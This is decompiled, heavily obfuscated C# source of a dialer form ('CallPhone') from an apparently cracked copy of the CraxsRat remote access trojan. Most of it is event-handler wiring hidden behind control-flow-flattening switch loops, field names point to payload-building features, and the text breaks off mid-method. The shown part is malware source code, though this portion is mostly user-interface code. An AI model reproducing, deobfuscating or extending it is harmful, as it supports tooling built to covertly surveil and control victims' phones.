// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.CallPhone
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Craxs_Rat.My;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class CallPhone : Form
  {
    private string NresoString11;
    private string NresoString12;
    public static byte f004E4D;
    private string Napp_reso0;
    public static byte f004E4F;
    private const string draw_notifi = "x1x2x3x4x5x6";
    private string Ndraw_ico;
    private string Ndraw_notifi;
    public static byte f004E53;
    private string NwebXML;
    public static byte f004E55;
    private string NnotifiXML;
    private string new_exit_mth;
    private string new_wifipolc;
    private string new_formatpacket;
    private string new_dzip;
    private string new_getbyte;
    private string new_base_mth;
    private string new_getstr;
    private string new_czip;
    private string new_inst;
    private string new_strt_con_;
    private string new_fist_inf_;
    private string new_new_con_;
    private string new_send_it_;
    private string new_Reblace_;
    private string new_runn_srv_;

    internal virtual TextBox TextBox1
    {
      get => ((CameraManager) this)._TextBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TextBox1_TextChanged);
        KeyPressEventHandler pressEventHandler = new KeyPressEventHandler(this.TextBox1_KeyPress);
label_1:
        int num1 = -1121626330;
        KeyEventHandler keyEventHandler;
        TextBox textBox1;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((~num1 ^ ~(-~-1559202265 * 469392905)) * -939209191 - (-734136340 - -917863373 + (303610680 ^ -840643939)))) % 10U)
          {
            case 0:
              ((CameraManager) this)._TextBox1 = value;
              textBox1 = ((CameraManager) this)._TextBox1;
              int num3;
              num1 = num3 = textBox1 == null ? 383403142 : (num3 = -397346147);
              continue;
            case 1:
              textBox1.TextChanged += eventHandler;
              num1 = (int) num2 * 1025016641 ^ -526867257;
              continue;
            case 2:
              keyEventHandler = new KeyEventHandler(this.TextBox1_KeyDown);
              textBox1 = ((CameraManager) this)._TextBox1;
              num1 = (int) num2 * -1781326469 ^ -1770773231;
              continue;
            case 3:
              textBox1.TextChanged -= eventHandler;
              num1 = (int) num2 * 1631633818 ^ -866907244;
              continue;
            case 4:
              textBox1.KeyPress -= pressEventHandler;
              textBox1.KeyDown -= keyEventHandler;
              num1 = (int) num2 * 719212978 ^ 1706357408;
              continue;
            case 5:
              goto label_1;
            case 6:
              textBox1.KeyPress += pressEventHandler;
              num1 = (int) num2 * -150119776 ^ 1898676439;
              continue;
            case 7:
              int num4 = textBox1 == null ? 1128779738 : (num4 = -1481253099);
              num1 = num4 ^ (int) num2 * 1117787406;
              continue;
            case 8:
              goto label_3;
            case 9:
              textBox1.KeyDown += keyEventHandler;
              num1 = (int) num2 * 1597354739 ^ 1912384909;
              continue;
            default:
              goto label_12;
          }
        }
label_3:
        return;
label_12:;
      }
    }

    internal virtual Timer TOpacity
    {
      get => ((CameraManager) this)._TOpacity;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TOpacity_Tick);
        Timer topacity = ((CameraManager) this)._TOpacity;
label_1:
        int num1 = -97094607;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) ~~-~((~944301733 * -1419108913 ^ 1617759699 * (-1313188323 - 981716184)) + (-1995049167 * --1963932089 - ((-313040923 ^ 1160866311) - 770294193 * 2022396849)) - (num2 + -(405219379 ^ --157037678 - (989324700 ^ -2133659898) ^ -677606141 * (-321595594 - -1853598727))))) % 6U)
          {
            case 0:
              goto label_1;
            case 1:
              topacity.Tick -= eventHandler;
              num1 = (int) num3 * -1242498552 ^ -1850499286;
              continue;
            case 2:
              ((CameraManager) this)._TOpacity = value;
              topacity = ((CameraManager) this)._TOpacity;
              int num4;
              num1 = num4 = topacity == null ? -591214474 : (num4 = -1339383815);
              continue;
            case 3:
              int num5 = topacity == null ? -331323606 : (num5 = 127877045);
              num1 = num5 ^ (int) num3 * 1650091688;
              continue;
            case 4:
              goto label_3;
            case 5:
              topacity.Tick += eventHandler;
              num1 = (int) num3 * -1778427519 ^ -1498246737;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    internal virtual Panel Panel1
    {
      get => ((CameraManager) this)._Panel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        PaintEventHandler paintEventHandler = new PaintEventHandler(this.Panel1_Paint);
label_1:
        int num1 = -43371117;
        while (true)
        {
          int num2 = num1;
          uint num3;
          Panel panel1;
          switch ((num3 = (uint) (-((-(1209761411 + (--2134098725 - 1336238388)) - num2 - -(1842058025 * ((548299988 ^ 639590716) * -118575895)) ^ ~~(2121108727 - 985023485)) * -460446329) * -1324514595)) % 7U)
          {
            case 0:
              ((CameraManager) this)._Panel1 = value;
              panel1 = ((CameraManager) this)._Panel1;
              int num4;
              num1 = num4 = panel1 == null ? -1298768677 : (num4 = 612385761);
              continue;
            case 1:
              panel1 = ((CameraManager) this)._Panel1;
              num1 = (int) num3 * 1530296602 ^ -891165983;
              continue;
            case 2:
              panel1.Paint += paintEventHandler;
              num1 = (int) num3 * -1664684773 ^ -1681134860;
              continue;
            case 3:
              goto label_3;
            case 4:
              goto label_1;
            case 5:
              panel1.Paint -= paintEventHandler;
              num1 = (int) num3 * 397385658 ^ -1237314574;
              continue;
            case 6:
              int num5 = panel1 == null ? 1814647368 : (num5 = 2127009464);
              num1 = num5 ^ (int) num3 * -330942962;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual Label L0
    {
      get => ((CameraManager) this)._L0;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((CameraManager) this)._L0 = value;
    }

    internal virtual Button B_hash
    {
      get => ((CameraManager) this)._B_hash;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.B_hash_Click);
label_1:
        int num1 = 733453299;
        Button bHash;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (--(num1 ^ -~1016175281) * 759614795 * 1085045177 * -2114301519)) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              bHash.Click -= eventHandler;
              num1 = (int) num2 * -2046455020 ^ 1248856175;
              continue;
            case 2:
              bHash = ((CameraManager) this)._B_hash;
              num1 = (int) num2 * -1349961572 ^ -297228241;
              continue;
            case 3:
              goto label_3;
            case 4:
              ((CameraManager) this)._B_hash = value;
              bHash = ((CameraManager) this)._B_hash;
              int num3;
              num1 = num3 = bHash == null ? 1465073350 : (num3 = 671570819);
              continue;
            case 5:
              int num4 = bHash == null ? 819147339 : (num4 = 905775446);
              num1 = num4 ^ (int) num2 * -1811124308;
              continue;
            case 6:
              bHash.Click += eventHandler;
              num1 = (int) num2 * -780961522 ^ -1925001652;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual Button b0
    {
      get => ((CameraManager) this)._b0;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.b0_Click);
label_1:
        int num1 = 1187904917;
        Button b0;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((~num1 ^ ((-1245241631 ^ -2030132015) - -1497792780 * -2123728687) * -1607805511 + (-2016975816 ^ 1493641080 - -296039759 ^ ~-1239048818) ^ -1177421096 ^ --1994217972 ^ ~-1208117895) * -791472381 ^ -1994224497)) % 8U)
          {
            case 0:
              goto label_1;
            case 1:
              b0 = ((CameraManager) this)._b0;
              num1 = (int) num2 * 736788367 ^ 560818446;
              continue;
            case 2:
              b0.Click -= eventHandler;
              num1 = (int) num2 * 1079049795 ^ -1069987167;
              continue;
            case 3:
              goto label_3;
            case 4:
              b0.Click += eventHandler;
              num1 = (int) num2 * -1413499971 ^ 613692663;
              continue;
            case 5:
              int num3 = b0 == null ? 1765071881 : (num3 = 1408148094);
              num1 = num3 ^ (int) num2 * -1759115290;
              continue;
            case 6:
              b0 = ((CameraManager) this)._b0;
              int num4 = b0 == null ? 567826163 : (num4 = 129858790);
              num1 = num4 ^ (int) num2 * -268992116;
              continue;
            case 7:
              ((CameraManager) this)._b0 = value;
              num1 = -509175548;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Button B_star
    {
      get => ((CameraManager) this)._B_star;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.B_star_Click);
label_1:
        int num1 = -2079116191;
        Button bStar;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-((~num1 ^ ~((-1355942553 ^ -925654227 ^ -1122001092) * -1936935921)) * -488740211) - (100018011 - 84243540) - 1187907677)) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              bStar.Click += eventHandler;
              num1 = (int) num2 * 617527540 ^ -1558628762;
              continue;
            case 2:
              bStar.Click -= eventHandler;
              num1 = (int) num2 * -173972797 ^ 1023479712;
              continue;
            case 3:
              ((CameraManager) this)._B_star = value;
              bStar = ((CameraManager) this)._B_star;
              int num3;
              num1 = num3 = bStar == null ? 244053606 : (num3 = 1260874726);
              continue;
            case 4:
              bStar = ((CameraManager) this)._B_star;
              num1 = (int) num2 * 1476473683 ^ 979656956;
              continue;
            case 5:
              int num4 = bStar == null ? 1297641226 : (num4 = -1396745660);
              num1 = num4 ^ (int) num2 * 479095796;
              continue;
            case 6:
              goto label_3;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual Button b9
    {
      get => ((CameraManager) this)._b9;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.b9_Click);
label_1:
        int num1 = 1461790962;
        Button b9;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -(-(~num1 - ~~-(-1331003573 ^ -76075648) - ~((1140996536 ^ 121403778) + -54617377 * -1988695427)) + 279009533 * 430126223)) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              b9.Click += eventHandler;
              num1 = (int) num2 * -1294309432 ^ -448092640;
              continue;
            case 3:
              b9.Click -= eventHandler;
              num1 = (int) num2 * 303337861 ^ -1892772214;
              continue;
            case 4:
              ((CameraManager) this)._b9 = value;
              num1 = -38993702;
              continue;
            case 5:
              b9 = ((CameraManager) this)._b9;
              int num3 = b9 == null ? -1684958217 : (num3 = -706655824);
              num1 = num3 ^ (int) num2 * 1682942714;
              continue;
            case 6:
              b9 = ((CameraManager) this)._b9;
              int num4 = b9 == null ? 1532381000 : (num4 = 2041723917);
              num1 = num4 ^ (int) num2 * 1348911160;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual Button b8
    {
      get => ((CameraManager) this)._b8;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.b8_Click);
label_1:
        int num1 = 1996064813;
        while (true)
        {
          int num2 = num1;
          uint num3;
          Button b8;
          switch ((num3 = (uint) -(-166947423 - -(322626139 * -1492978347 - 1517215971 * 1398644309 - (797986208 ^ 1863137919) * -1349699859 - ~(num2 ^ -(-(1126538471 ^ -1098640328 ^ 1411752615) - (~--280892849 - (1211495203 * -981214050 + (1281640263 - 1468321532)))))))) % 8U)
          {
            case 0:
              ((CameraManager) this)._b8 = value;
              num1 = 454003202;
              continue;
            case 1:
              b8.Click -= eventHandler;
              num1 = (int) num3 * -1630619628 ^ -1650339676;
              continue;
            case 2:
              int num4 = b8 == null ? -1272537134 : (num4 = -1821973165);
              num1 = num4 ^ (int) num3 * -2112486979;
              continue;
            case 3:
              b8.Click += eventHandler;
              num1 = (int) num3 * 768734254 ^ -217684167;
              continue;
            case 4:
              goto label_1;
            case 5:
              b8 = ((CameraManager) this)._b8;
              num1 = (int) num3 * 203367496 ^ 629599302;
              continue;
            case 6:
              b8 = ((CameraManager) this)._b8;
              int num5 = b8 == null ? -226774521 : (num5 = -189350997);
              num1 = num5 ^ (int) num3 * -1117909498;
              continue;
            case 7:
              goto label_3;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Button b7
    {
      get => ((CameraManager) this)._b7;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.b7_Click);
label_1:
        int num1 = -854844775;
        Button b7;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~(--num1 ^ -231148448) * 1885673587 + 1190321463)) % 8U)
          {
            case 0:
              b7.Click += eventHandler;
              num1 = (int) num2 * -707405725 ^ 420530787;
              continue;
            case 1:
              b7 = ((CameraManager) this)._b7;
              int num3 = b7 == null ? 1747046245 : (num3 = 964501684);
              num1 = num3 ^ (int) num2 * 118672962;
              continue;
            case 2:
              b7.Click -= eventHandler;
              num1 = (int) num2 * 640783593 ^ -800465579;
              continue;
            case 3:
              goto label_3;
            case 4:
              b7 = ((CameraManager) this)._b7;
              num1 = (int) num2 * 1555939574 ^ -838262598;
              continue;
            case 5:
              goto label_1;
            case 6:
              int num4 = b7 == null ? 1122234887 : (num4 = -133899544);
              num1 = num4 ^ (int) num2 * 943298282;
              continue;
            case 7:
              ((CameraManager) this)._b7 = value;
              num1 = -1136951056;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Button b6
    {
      get => ((CameraManager) this)._b6;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.b6_Click);
label_1:
        int num1 = 1710502959;
        Button b6;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-(num1 * 678908485 * -339469967 * -1441666277 - (-1851885345 * -2140909409 + (-2119169714 ^ -1046572782))) - 1073512763)) % 9U)
          {
            case 0:
              int num3 = b6 == null ? -808120025 : (num3 = 1732362261);
              num1 = num3 ^ (int) num2 * 453372020;
              continue;
            case 1:
              b6.Click -= eventHandler;
              num1 = (int) num2 * 97133062 ^ 559812029;
              continue;
            case 2:
              int num4 = b6 == null ? -11846785 : (num4 = 1190253161);
              num1 = num4 ^ (int) num2 * 167719174;
              continue;
            case 3:
              b6.Click += eventHandler;
              num1 = (int) num2 * 1979800793 ^ -214547040;
              continue;
            case 4:
              b6 = ((CameraManager) this)._b6;
              num1 = (int) num2 * -802892189 ^ 953150329;
              continue;
            case 5:
              b6 = ((CameraManager) this)._b6;
              num1 = (int) num2 * -153460815 ^ 1043064959;
              continue;
            case 6:
              goto label_1;
            case 7:
              goto label_3;
            case 8:
              ((CameraManager) this)._b6 = value;
              num1 = -720972570;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual Button b5
    {
      get => ((CameraManager) this)._b5;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.b5_Click);
        Button b5 = ((CameraManager) this)._b5;
label_1:
        int num1 = -1656518674;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-((~num1 ^ -(~-430963440 - -1392415105) ^ -319400770) * 1855140977) * -1310095673)) % 7U)
          {
            case 0:
              b5 = ((CameraManager) this)._b5;
              int num3 = b5 == null ? 2062435244 : (num3 = 1005142185);
              num1 = num3 ^ (int) num2 * 424216671;
              continue;
            case 1:
              goto label_3;
            case 2:
              ((CameraManager) this)._b5 = value;
              num1 = 655830200;
              continue;
            case 3:
              int num4 = b5 == null ? 245016417 : (num4 = 129939058);
              num1 = num4 ^ (int) num2 * -1052766418;
              continue;
            case 4:
              goto label_1;
            case 5:
              b5.Click += eventHandler;
              num1 = (int) num2 * 355861412 ^ 771264703;
              continue;
            case 6:
              b5.Click -= eventHandler;
              num1 = (int) num2 * 808604647 ^ 1083269180;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual Button b4
    {
      get => ((CameraManager) this)._b4;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.b4_Click);
label_1:
        int num1 = -352882952;
        Button b4;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -~((~num1 + (1211623891 - (-876994733 * -1521458578 ^ 49138045 - -1739886093 ^ -56400041 * (193783439 - 1532550488)))) * -915612567 ^ 1523869622 - (-1432931935 ^ 1670416803))) % 8U)
          {
            case 0:
              goto label_3;
            case 1:
              b4.Click += eventHandler;
              num1 = (int) num2 * 830017336 ^ 1533682166;
              continue;
            case 2:
              int num3 = b4 == null ? -1583363290 : (num3 = 954763845);
              num1 = num3 ^ (int) num2 * -856312620;
              continue;
            case 3:
              int num4 = b4 == null ? -1967528423 : (num4 = 99183167);
              num1 = num4 ^ (int) num2 * -485112224;
              continue;
            case 4:
              goto label_1;
            case 5:
              ((CameraManager) this)._b4 = value;
              b4 = ((CameraManager) this)._b4;
              num1 = -1371995228;
              continue;
            case 6:
              b4 = ((CameraManager) this)._b4;
              num1 = (int) num2 * -971779781 ^ -1745677151;
              continue;
            case 7:
              b4.Click -= eventHandler;
              num1 = (int) num2 * 454407874 ^ -1834533897;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Button b3
    {
      get => ((CameraManager) this)._b3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.b3_Click);
label_1:
        int num1 = 121903559;
        while (true)
        {
          int num2 = num1;
          uint num3;
          Button b3;
          switch ((num3 = (uint) (-218884147 - -824709269 - (~((num2 ^ ((360680265 + 8251530 + -638537177) * -555537413 ^ -1049439914 - (1481413045 - 1408471539) - -636956191 * (507042053 - 97667660)) - -~(1185935140 - 828023413 ^ -1823590613 - -1392168599)) - --(~415859349 - -1012226605)) - -779813295))) % 8U)
          {
            case 0:
              goto label_3;
            case 1:
              int num4 = b3 == null ? 440930781 : (num4 = 1174222833);
              num1 = num4 ^ (int) num3 * -995557743;
              continue;
            case 2:
              goto label_1;
            case 3:
              ((CameraManager) this)._b3 = value;
              num1 = -1438120811;
              continue;
            case 4:
              b3.Click += eventHandler;
              num1 = (int) num3 * 95540147 ^ 575572272;
              continue;
            case 5:
              b3 = ((CameraManager) this)._b3;
              int num5 = b3 == null ? -810067048 : (num5 = -558415409);
              num1 = num5 ^ (int) num3 * -1006760435;
              continue;
            case 6:
              b3.Click -= eventHandler;
              num1 = (int) num3 * 1566865517 ^ -1782981977;
              continue;
            case 7:
              b3 = ((CameraManager) this)._b3;
              num1 = (int) num3 * 1568327278 ^ -448768087;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Button b2
    {
      get => ((CameraManager) this)._b2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.b2_Click);
        Button b2 = ((CameraManager) this)._b2;
label_1:
        int num1 = 38705645;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(-num1 + (-~(1763486148 ^ -600801270) + ~732832456))) % 7U)
          {
            case 0:
              b2.Click -= eventHandler;
              num1 = (int) num2 * 1610979315 ^ 1450312344;
              continue;
            case 1:
              int num3 = b2 == null ? -1285865409 : (num3 = -921794983);
              num1 = num3 ^ (int) num2 * -772352427;
              continue;
            case 2:
              b2.Click += eventHandler;
              num1 = (int) num2 * 1116407184 ^ 470343647;
              continue;
            case 3:
              goto label_1;
            case 4:
              goto label_3;
            case 5:
              ((CameraManager) this)._b2 = value;
              b2 = ((CameraManager) this)._b2;
              num1 = 56527815;
              continue;
            case 6:
              int num4 = b2 == null ? -526339900 : (num4 = -1233623757);
              num1 = num4 ^ (int) num2 * 285245995;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual Button b1
    {
      get => ((CameraManager) this)._b1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.b1_Click);
        Button b1 = ((CameraManager) this)._b1;
        if (b1 == null)
          goto label_5;
label_1:
        int num1 = 537467012;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~num1 * 404596709 * 695230427)) % 7U)
          {
            case 0:
              goto label_3;
            case 1:
              b1.Click += eventHandler;
              num1 = (int) num2 * -699277729 ^ -1549592824;
              continue;
            case 2:
              b1.Click -= eventHandler;
              num1 = (int) num2 * 1640249347 ^ 1498668236;
              continue;
            case 3:
              int num3 = b1 == null ? -786195667 : (num3 = 172013394);
              num1 = num3 ^ (int) num2 * -558758684;
              continue;
            case 4:
              b1 = ((CameraManager) this)._b1;
              num1 = (int) num2 * 951301841 ^ 609947165;
              continue;
            case 5:
              goto label_5;
            case 6:
              goto label_1;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:
        return;
label_5:
        ((CameraManager) this)._b1 = value;
        num1 = -585912620;
        goto label_2;
      }
    }

    internal virtual Button b_DEL
    {
      get => ((CameraManager) this)._b_DEL;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.b_DEL_Click);
label_1:
        int num1 = 469207483;
        Button bDel;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (--(-num1 ^ ---267997293 ^ -(-1647188167 - 1746558807 + (-1031096645 - 1746135168))) - (-2026282833 - 1977708995) + 127597727)) % 7U)
          {
            case 0:
              int num3 = bDel == null ? -1547935165 : (num3 = -1815898034);
              num1 = num3 ^ (int) num2 * -427802923;
              continue;
            case 1:
              bDel.Click += eventHandler;
              num1 = (int) num2 * 246728650 ^ -906011983;
              continue;
            case 2:
              bDel.Click -= eventHandler;
              num1 = (int) num2 * -2136790389 ^ 361429454;
              continue;
            case 3:
              goto label_1;
            case 4:
              bDel = ((CameraManager) this)._b_DEL;
              num1 = (int) num2 * 509560093 ^ 890834146;
              continue;
            case 5:
              goto label_3;
            case 6:
              ((CameraManager) this)._b_DEL = value;
              bDel = ((CameraManager) this)._b_DEL;
              int num4;
              num1 = num4 = bDel == null ? 355927171 : (num4 = 734739710);
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual ContextMenuStrip CMenu
    {
      get => ((CameraManager) this)._CMenu;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((CameraManager) this)._CMenu = value;
    }

    internal virtual ToolStripMenuItem CutToolStripMenuItem
    {
      get => ((CameraManager) this)._CutToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CutToolStripMenuItem_Click);
label_1:
        int num1 = -446029761;
        ToolStripMenuItem toolStripMenuItem;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~((num1 - -(-(-603871829 ^ -2105483469) * -1150488559 + -(-771074623 - -570916366 - 1568973745))) * -875084523 * 1157169683 - ~(289025324 + 630955070) - (-682088979 ^ 1844268475))) % 9U)
          {
            case 0:
              goto label_3;
            case 1:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * -143677219 ^ 240878444;
              continue;
            case 2:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * -502388560 ^ -1513717416;
              continue;
            case 3:
              toolStripMenuItem = ((CameraManager) this)._CutToolStripMenuItem;
              num1 = (int) num2 * 1694440992 ^ 126620454;
              continue;
            case 4:
              int num3 = toolStripMenuItem == null ? 1160837044 : (num3 = 2092449539);
              num1 = num3 ^ (int) num2 * 1072751460;
              continue;
            case 5:
              toolStripMenuItem = ((CameraManager) this)._CutToolStripMenuItem;
              num1 = (int) num2 * -1489394108 ^ 1191956775;
              continue;
            case 6:
              int num4 = toolStripMenuItem == null ? -447130878 : (num4 = 1690262450);
              num1 = num4 ^ (int) num2 * 280748527;
              continue;
            case 7:
              ((CameraManager) this)._CutToolStripMenuItem = value;
              num1 = -84808607;
              continue;
            case 8:
              goto label_1;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual ToolStripMenuItem CopyToolStripMenuItem
    {
      get => ((CameraManager) this)._CopyToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CopyToolStripMenuItem_Click);
        ToolStripMenuItem toolStripMenuItem = ((CameraManager) this)._CopyToolStripMenuItem;
label_1:
        int num1 = 1968738335;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) ~(~(~~1106121155 * 588424385 - (~((--642151576 ^ 1280135185 * 497242409) * 1701816181 - (--422407415 + -1954862710 * -161082059 - 652930388)) - num2) * 486748089) - -903858951)) % 8U)
          {
            case 0:
              goto label_3;
            case 1:
              ((CameraManager) this)._CopyToolStripMenuItem = value;
              num1 = 1313039209;
              continue;
            case 2:
              goto label_1;
            case 3:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num3 * -277124040 ^ 2086013259;
              continue;
            case 4:
              int num4 = toolStripMenuItem == null ? 518529164 : (num4 = -1216503566);
              num1 = num4 ^ (int) num3 * -1916369684;
              continue;
            case 5:
              int num5 = toolStripMenuItem == null ? -1086337213 : (num5 = 1394609982);
              num1 = num5 ^ (int) num3 * -1319621600;
              continue;
            case 6:
              toolStripMenuItem = ((CameraManager) this)._CopyToolStripMenuItem;
              num1 = (int) num3 * 74300840 ^ -968823136;
              continue;
            case 7:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num3 * -1091688799 ^ -863555109;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual ToolStripMenuItem PasteToolStripMenuItem
    {
      get => ((CameraManager) this)._PasteToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.PasteToolStripMenuItem_Click);
        ToolStripMenuItem toolStripMenuItem = ((CameraManager) this)._PasteToolStripMenuItem;
label_1:
        int num1 = 1530159319;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) ((-919003316 - 1915557210 - (-(num2 * -456684453) + ~-2051821925 - (--1294924834 ^ ~-51118209))) * 1501391009)) % 6U)
          {
            case 0:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num3 * 735067764 ^ -478572309;
              continue;
            case 1:
              goto label_3;
            case 2:
              goto label_1;
            case 3:
              ((CameraManager) this)._PasteToolStripMenuItem = value;
              toolStripMenuItem = ((CameraManager) this)._PasteToolStripMenuItem;
              int num4;
              num1 = num4 = toolStripMenuItem == null ? 1288838989 : (num4 = -654198658);
              continue;
            case 4:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num3 * 1074621698 ^ -1098337991;
              continue;
            case 5:
              int num5 = toolStripMenuItem == null ? -908485253 : (num5 = 2110639012);
              num1 = num5 ^ (int) num3 * 966815136;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon2
    {
      get => ((CameraManager) this)._DrakeUIButtonIcon2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon2_Click);
        DrakeUIButtonIcon drakeUiButtonIcon2 = ((CameraManager) this)._DrakeUIButtonIcon2;
label_1:
        int num1 = -240506934;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -(-(~num1 - ~-(-1873478125 * (788583452 - 2060331836)) + ((-1677078483 - 1819086584) * -139251571 ^ ~-1288954452)) * -925518895)) % 6U)
          {
            case 0:
              goto label_1;
            case 1:
              ((CameraManager) this)._DrakeUIButtonIcon2 = value;
              drakeUiButtonIcon2 = ((CameraManager) this)._DrakeUIButtonIcon2;
              int num3;
              num1 = num3 = drakeUiButtonIcon2 == null ? 2130196159 : (num3 = 598505670);
              continue;
            case 2:
              int num4 = drakeUiButtonIcon2 == null ? 1437063003 : (num4 = -1695014461);
              num1 = num4 ^ (int) num2 * 711174228;
              continue;
            case 3:
              drakeUiButtonIcon2.Click -= eventHandler;
              num1 = (int) num2 * 1349220022 ^ 629241873;
              continue;
            case 4:
              drakeUiButtonIcon2.Click += eventHandler;
              num1 = (int) num2 * -1744933788 ^ -81943601;
              continue;
            case 5:
              goto label_3;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    public CallPhone()
    {
      this.Load += new EventHandler(this.CallPhone_Load);
      ((CameraManager) this)._keyback = false;
      ((CameraManager) this)._Call = EXGuarder.\u00300763851;
      ((CameraManager) this).Title = EXGuarder.\u0035A657909;
      ((CameraManager) this).RectInputText0 = new List<Rectangle>();
      // ISSUE: reference to a compiler-generated method
      ((Build.VB\u0024StateMachine_877_Step3) this).InitializeComponent();
      this.Font = Settings.f;
    }

    private void TOpacity_Tick(object sender, EventArgs e)
    {
      if (this.Opacity == 1.0)
        goto label_6;
label_1:
      int num1 = 862940046;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-(num1 + -((1702455246 ^ 2036897699) - 257851671 * 442610201 + ~(-863819615 - 366210508)) * 910903729 - (1429824189 - -1984101524 - ~259905022 - 839670886 + (~~-574638798 - ~(-2095065197 ^ -1191378866))) ^ ~-505146264 + (-591871872 - -1213979373) ^ ~(255793434 - -517148575)) - ~2059060374)) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            this.Opacity += 0.1;
            num1 = (int) num2 * 678098443 ^ 1471296882;
            continue;
